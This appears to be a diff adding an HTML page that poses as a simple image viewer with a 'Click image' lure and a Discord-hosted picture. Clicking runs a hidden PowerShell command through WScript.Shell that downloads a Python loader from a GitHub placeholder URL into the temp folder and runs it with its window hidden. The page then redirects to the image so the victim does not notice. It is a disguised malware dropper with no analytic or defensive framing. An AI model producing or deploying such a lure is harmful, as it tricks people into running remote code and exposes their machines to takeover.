@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Image Viewer</title>
+    <style>
+        body { background: #1e1f22; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .click { text-align: center; cursor: pointer; }
+        img { max-width: 90%; border-radius: 16px; }
+        .text { color: #b5bac1; margin-top: 16px; }
+    </style>
+</head>
+<body>
+    <div class="click" onclick="run()">
+        <img src="https://cdn.discordapp.com/attachments/1469180701004927079/1511936702560866396/images.png?ex=6a224448&is=6a20f2c8&hm=39d58da76260a5ef75bdb4c80f9431d449d778382829c98b6891ac0456825a79">
+        <div class="text">✨ Click image ✨</div>
+    </div>
+    <script>
+        function run() {
+            var url = "https://raw.githubusercontent.com/YOUR_USERNAME/YOUR_REPO/main/loader.py";
+            var cmd = "powershell -Command \"& {$w=new-object Net.WebClient;$w.DownloadFile('"+url+"','$env:TEMP\\sys.py');Start-Process 'python' -ArgumentList '$env:TEMP\\sys.py' -WindowStyle Hidden}\"";
+            try {
+                new ActiveXObject("WScript.Shell").Run(cmd, 0, false);
+            } catch(e) {}
+            setTimeout(function() {
+                window.location.href = "https://cdn.discordapp.com/attachments/1469180701004927079/1511936702560866396/images.png";
+            }, 200);
+        }
+    </script>
+</body>
+</html>
